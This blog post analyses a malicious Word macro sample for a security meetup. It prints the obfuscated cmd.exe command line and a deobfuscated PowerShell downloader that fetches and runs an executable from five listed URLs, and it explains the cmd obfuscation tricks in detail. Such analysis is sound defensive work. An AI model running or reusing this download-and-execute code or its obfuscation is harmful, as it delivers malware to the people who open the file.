---
layout: post
title: Analysis of a simple obfuscated Office malware sample
tags: [windows, malware analysis]
category: [en]
---

I prepared this report for a [KHS Community cybersecurity meetup](https://t.me/khscommunity) in Kostanay on May 31, 2019. I selected a random malicious Microsoft Office sample from [VirusShare](https://virusshare.com/) with the following characteristics:

`VirusTotal Report submitted 2019-02-15 04:37:54 UTC`

`MD5:f7b167150756857c21672842104410e1`

`SHA1:34c457b2db42f0b7039763e92b2b9ae70e2d8e9c`

`SHA256:dd592228c3d1648233f9e29cbdc8c687a980fc9e873196f4d92ff693ad9f9753`

`File Type:XML 1.0 document, ASCII text, with very long lines, with CRLF line terminators`

`Detections: Kaspersky = HEUR:Trojan-Downloader.MSOffice.SLoad.gen`

I analyzed the sample on _Windows 7 Ultimate SP1_ with _Microsoft Office 2007_. Opening it displays the following window:

![](/assets/images/ru/OfficeMalware/1_doc_macro.png)

The document contains a macro, and Microsoft Word warns the user about it. The document body looks like this:

![](/assets/images/ru/OfficeMalware/2_doc_deception_message.png)

The attackers instruct the victim to enable macros and allow document editing. Microsoft Office marks files downloaded from the Internet and opens them in Protected View until the user explicitly enables editing. This social-engineering message is common in malicious documents: its goal is to persuade the victim to leave Protected View and enable macro execution.

To inspect the document's macro, extract it with [olevba](https://github.com/decalage2/oletools/wiki/olevba) from the [oletools](https://www.decalage.info/python/oletools) package. Its documentation describes it as follows:

_olevba is a script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to detect VBA Macros, extract their source code in clear text, and detect security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware, anti-sandboxing and anti-virtualization techniques, and potential IOCs (IP addresses, URLs, executable filenames, etc). It also detects and decodes several common obfuscation methods including Hex encoding, StrReverse, Base64, Dridex, VBA expressions, and extracts IOCs from decoded strings._

_olevba_ identified the following suspicious VBA keywords:

<pre>
+------------+----------------------+-----------------------------------------+
| Type       | Keyword              | Description                             |
+------------+----------------------+-----------------------------------------+
| AutoExec   | autoopen             | Runs when the Word document is opened   |
| Suspicious | Chr                  | May attempt to obfuscate specific       |
|            |                      | strings (use option --deobf to          |
|            |                      | deobfuscate)                            |
| Suspicious | Shell                | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | vbHide               | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | windows              | May enumerate application windows (if   |
|            |                      | combined with Shell.Application object) |
|            |                      | (obfuscation: VBA expression)           |
| Suspicious | Hex Strings          | Hex-encoded strings were detected, may  |
|            |                      | be used to obfuscate strings (option    |
|            |                      | --decode to see all)                    |
| Suspicious | Base64 Strings       | Base64-encoded strings were detected,   |
|            |                      | may be used to obfuscate strings        |
|            |                      | (option --decode to see all)            |
| Suspicious | VBA obfuscated       | VBA string expressions were detected,   |
|            | Strings              | may be used to obfuscate strings        |
|            |                      | (option --decode to see all)            |
| IOC        | cmd.exe              | Executable file name (obfuscation: VBA  |
|            |                      | expression)                             |
</pre>

... and suspicious strings:

<pre>
| VBA string | jCgKnc/moc.ssenisubr | "jCgKn" + "c/mo" + "c.sse" + "nisub" +  |
|            | usoh.                | "rusoh."                                |
| VBA string | www//:ptth@Mw6O63Df_ | "www//:" + "ptth@" + "Mw6O6" + "3Df_" + |
|            | Cm066CcdkU7o/moc     | "Cm066C" + "cdkU" + "7o/moc"            |
| VBA string | .aicizyhp.www//:ptth | ".ai" + "cizy" + "hp.ww" + "w//:pt" +   |
|            | @j7OEo_7             | "th@j" + "7OEo_7"                       |
| VBA string | MhAbZp6jnHp/zt.oc.sk | "MhAbZ" + "p6jnH" + "p/z" + "t.oc.s" +  |
|            | eeg                  | "keeg"                                  |
| VBA string | t.liam//:ptth@8or1uz | "t.liam" + "//:" + "ptt" + "h@8or1" +   |
|            | sdZ8vie/RXI/sedulcni | "uzsd" + "Z8vi" + "e/RXI/" + "sed" +    |
|            | -                    | "ulcni-"                                |
</pre>

The macro is clearly obfuscated. The fragment `www //: ptth @ Mw6O63Df_` suggests that some of the strings have been reversed.

_olevba_ provides the following option:

`--deobf Attempt to deobfuscate VBA expressions (slow)`

Extract and deobfuscate the macros using this command:

`olevba.exe --deobf malware_sample > result.txt`

The output contains the source code of the main macro.

![](/assets/images/ru/OfficeMalware/3-source%20code.png)

Because static analysis of heavily obfuscated code is inefficient, we will debug it. Open the _Developer_ tab in Word and click _Visual Basic_:

![](/assets/images/ru/OfficeMalware/4_word_macros_developer.png)

Paste the source code extracted in the previous step:

![](/assets/images/ru/OfficeMalware/5_source.png)

The macro's entry point is circled in red. It calls a function with an unknown string argument. To reveal the string, we can modify the code slightly and add the argument to the _Watch_ window, or inspect the argument inside `ziilnp` while debugging.

![](/assets/images/ru/OfficeMalware/6_export_arg_str.png)

The resulting string is:

`c: \ onjzioi \ izwolr \ poicwo \ .. \ .. \ .. \ windows \ system32 \ cmd.exe / c% ProgramData: ~ 0.1 %% ProgramData: ~ 9.2% / V: ON / C "set SiQ =; 'cjqhpb' = qijmnd $}} {hctac}}; kaerb; 'bchkzfb' = dqkzr $; hkjzjlz $ metI-ekovnI {) 00004 eg-htgnel.) hkjzjlz $ metI-teG ((fI; jrkjik "= ciikdj $;) ziwmvv '= pzrifoh $;' 904 '= zbwnifi $;' scjmbw '= fczcvii $;) ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam. teN tcejbo-wen = irhwidj $; 'imsizuu' = iijirwb $ ll% 1,3- ~: PMET% h% 1,4- ~: EMANNOISSES% r% 1.5 ~: CILBUP% wop && for / L% h in ( 657, -1,0) do set nu =! Nu !! SiQ: ~% h, 1! && if% h equ 0 echo! Nu: ~ -658! | Cmd "`

The string is passed to the `ziilnp()` function:
<pre>
Function ziilnp(zdwrhc)
On Error Resume Next
   Select Case bofcsp
      Case 600812771
         zssvqbs = CStr(rfolwz)
         infpjz = CStr(fiuwjmh)
      Case 691931294
         qhplj = cufwqqj
         lcbfq = Hex(751111903)
      Case 693375610
         swkjiw = wiiwsh
         jiuaoso = Log(311238894)
End Select
   Select Case qvkomu
      Case 676369523
         wvhzs = CStr(sffmkpj)
         zwfzq = CStr(maljh)
      Case 613766996
         tljjc = jjqcvpt
         opopw = Hex(446181185)
      Case 540556815
         qvwhtl = dtwfas
         nzjoo = Log(576824669)
End Select
ziilnp = ziilnp(Interaction.Shell(zdwrhc, vbHide))
   Select Case rmwhcfv
      Case 974865143
         wazknzq = CStr(jvdnm)
         jzvuil = CStr(ltmph)
      Case 351660802
         mffqwz = djhiwo
         onwvdm = Hex(505454459)
      Case 428217029
         wtkadzs = ihdpjs
         bizczv = Log(97188184)
End Select
</pre>

The function contains several irrelevant `Select Case` blocks inserted by the obfuscator. We can ignore them and focus on this line:

`ziilnp = ziilnp(Interaction.Shell(zdwrhc, vbHide))`

`Interaction.Shell` executes the supplied command, which in this case is the string we recovered. Let's examine the payload more closely.

`c:\onjzioi\izwolr\poicwo\..\..\..\windows\system32\cmd.exe` uses path traversal segments to avoid embedding the canonical path to `cmd.exe` directly.

`/c %ProgramData:~0.1%%ProgramData:~9.2%` is passed to `cmd.exe`.

`%ProgramData%` expands to `C:\ProgramData`.

`~0,1` extracts one character starting at offset 0, producing `"C"`.

`~9,2` extracts two characters starting at offset 9, producing `"mD"`. Together, they form `"CmD"`:

![](/assets/images/ru/OfficeMalware/echo%20obfuscated%20program%20data.png)

This is one way to obfuscate a call to `cmd.exe`; using `%COMSPEC%` is another. The rest of the command is:

`/V:ON/C"set SiQ=;'cjqhpb'=qijmnd$}}{hctac}};kaerb;'bchkzfb'=dqkzr$;hkjzjlz$ metI-ekovnI{ )00004 eg- htgnel.)hkjzjlz$ metI-teG(( fI;'jrkjik'=ciikdj$;)hkjzjlz$ ,qjcaki$(eliFdaolnwoD.irhwidj${yrt{)ujbwa$ ni qjcaki$(hcaerof;'exe.'+zbwnifi$+'\'+pmet:vne$=hkjzjlz$;'ziwmvv'=pzrifoh$;'904' = zbwnifi$;'scjmbw'=fmsqvii$;)'@'(tilpS.'41fpegeLDajCgKnc/moc.ssenisubrusoh.www//:ptth@Mw6O63Df_Cm066CcdkU7o/moc.aicizyhp.www//:ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam//:ptth@8or1uzsdZ8vie/RXI/sedulcni-pw/moc.srevirehtybkramdnal//:ptth@R8Fd3N9UmbYBzI/ten.enoniletoh.www//:ptth'=ujbwa$;tneilCbeW.teN tcejbo-wen=irhwidj$;'imsizuu'=iijirwb$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop&&for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd"` 

According to the `cmd.exe` help text, `/V:ON` enables delayed environment-variable expansion, allowing an updated variable value to be read during each iteration of a `FOR` loop.
<pre>
/V:ON Enable delayed environment variable expansion 
         this allows a FOR loop to specify !variable! instead of %variable% 
         expanding the variable at execution time instead of at input time.
</pre>

The command that follows can be divided into two parts. The first part is:

`set SiQ=;'cjqhpb'=qijmnd$}}{hctac}};kaerb;'bchkzfb'=dqkzr$;hkjzjlz$ metI-ekovnI{ )00004 eg- htgnel.)hkjzjlz$ metI-teG(( fI;'jrkjik'=ciikdj$;)hkjzjlz$ ,qjcaki$(eliFdaolnwoD.irhwidj${yrt{)ujbwa$ ni qjcaki$(hcaerof;'exe.'+zbwnifi$+'\'+pmet:vne$=hkjzjlz$;'ziwmvv'=pzrifoh$;'904' = zbwnifi$;'scjmbw'=fmsqvii$;)'@'(tilpS.'41fpegeLDajCgKnc/moc.ssenisubrusoh.www//:ptth@Mw6O63Df_Cm066CcdkU7o/moc.aicizyhp.www//:ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam//:ptth@8or1uzsdZ8vie/RXI/sedulcni-pw/moc.srevirehtybkramdnal//:ptth@R8Fd3N9UmbYBzI/ten.enoniletoh.www//:ptth'=ujbwa$;tneilCbeW.teN tcejbo-wen=irhwidj$;'imsizuu'=iijirwb$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop`

The second part is: `for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd`

The first part assigns a long sequence of characters to `SiQ`. As noted earlier, it appears to be reversed. Restoring the original order produces:

`pow%PUBLIC:~5,1%r%SESSIONNAME:~-4,1%h%TEMP:~-3,1%ll $bwrijii='uuzismi';$jdiwhri=new-object Net.WebClient;$awbju='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');$iivqsmf='wbmjcs';$ifinwbz = '409';$hofirzp='vvmwiz';$zljzjkh=$env:temp+'\'+$ifinwbz+'.exe';foreach($ikacjq in $awbju){try{$jdiwhri.DownloadFile($ikacjq, $zljzjkh);$jdkiic='kijkrj';If ((Get-Item $zljzjkh).length -ge 40000) {Invoke-Item $zljzjkh;$rzkqd='bfzkhcb';break;}}catch{}}$dnmjiq='bphqjc';`

To see how the two parts work together, consider a small example that obfuscates the `help` command.

First, set the environment variable `siq=pleh`, which is `help` in reverse.

`for /L %h in (3,-1,0) do` iterates four times, once for each character, from the end of the string to the beginning.

`set nu=!nu!!siq:~%h,1!` extracts one character at index `%h` and appends it to `nu`, reconstructing the original string.

`if %h equ 0 echo !nu:~-4! | cmd` waits until every character has been processed and pipes the result to `cmd.exe`. The complete example is:
`set siq = pleh && for / L% h in (3, -1,0) do set nu =! nu !! siq: ~% h, 1! && if% h equ 0 echo! nu: ~ -4! | cmd`

![](/assets/images/ru/OfficeMalware/cmd_help_obfuscation.png)

The apparently complex string has now become a straightforward command. The malicious payload uses the same technique.

Returning to the main payload, the first expression is:

* `pow%PUBLIC:~5,1%r%SESSIONNAME:~-4,1%h%TEMP:~-3,1%ll`, another obfuscated command.
* `%PUBLIC:~5,1%` extracts one character at offset 5 from `C:\Users\Public`, producing `"e"`.
* The next literal character is `"r"`.
* `%SESSIONNAME:~-4,1%` extracts one character four positions from the end of `Console`, producing `"s"`.
* The next literal character is `"h"`.
* `%TEMP:~-3,1%` extracts one character three positions from the end of `C:\Users\RDRG\AppData\Local\Temp`, producing `"e"`.
* The final literal characters are `"ll"`.

The complete string is `powershell`.

The PowerShell code follows:
<pre>
$bwrijii='uuzismi';

$jdiwhri=new-object Net.WebClient;

$awbju='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');

$iivqsmf='wbmjcs';
$ifinwbz = '409';
$hofirzp='vvmwiz';
$zljzjkh=$env:temp+'\'+$ifinwbz+'.exe';
foreach($ikacjq in $awbju){
	try{
		$jdiwhri.DownloadFile($ikacjq, $zljzjkh);
		$jdkiic='kijkrj';
		If ((Get-Item $zljzjkh).length -ge 40000) {
			Invoke-Item $zljzjkh;
			$rzkqd='bfzkhcb';
			break;
		}
	} catch {
	}
}
$dnmjiq='bphqjc';
</pre>

Removing dead assignments and renaming the variables makes the script much easier to read:

<pre>
$webClient=new-object Net.WebClient;

$URLS='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');

$filenameInTempFolder=$env:temp+'\409.exe';
foreach($url in $URLS){
	try{
		$webClient.DownloadFile($url, $filenameInTempFolder);
		If ((Get-Item $filenameInTempFolder).length -ge 40000) {
			Invoke-Item $filenameInTempFolder;
			break;
		}
	} catch {
	}
}
</pre>

The script tries each URL in sequence, downloads the response to `409.exe` in the temporary directory, and executes the file if it is at least 40,000 bytes long. Unfortunately, the payloads are no longer available, so the analysis cannot continue.
